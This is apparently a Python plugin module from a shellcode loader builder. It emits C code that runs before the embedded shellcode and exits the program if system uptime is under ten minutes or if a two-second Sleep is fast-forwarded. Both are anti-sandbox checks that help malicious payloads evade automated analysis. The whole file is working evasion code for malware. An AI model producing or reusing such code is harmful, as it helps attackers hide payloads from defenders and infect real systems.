import random
import string

class timecheck:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return f'{self.name}();\n\t' + shellcodestring

    def codeblock(self) -> str:

        return f"""

static double qpc_now_seconds(void) {{
    LARGE_INTEGER freq;
    LARGE_INTEGER counter;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&counter);
    return (double)counter.QuadPart / (double)freq.QuadPart;
}}

void {self.name}()
{{
    ULONGLONG min_minutes = 10;
    ULONGLONG uptime_ms = GetTickCount64();
    ULONGLONG min_ms = (ULONGLONG)min_minutes * 60ULL * 1000ULL;

    if (uptime_ms < min_ms) {{
        exit(0);
    }}

    DWORD sleep_ms = 2000;
    DWORD tolerance_ms = 250;

    double t0 = qpc_now_seconds();
    Sleep(2000);
    double t1 = qpc_now_seconds();

    double elapsed_ms = (t1 - t0) * 1000.0;
    if (elapsed_ms + (double)tolerance_ms < (double)sleep_ms) {{
        exit(0);
    }}
}}
"""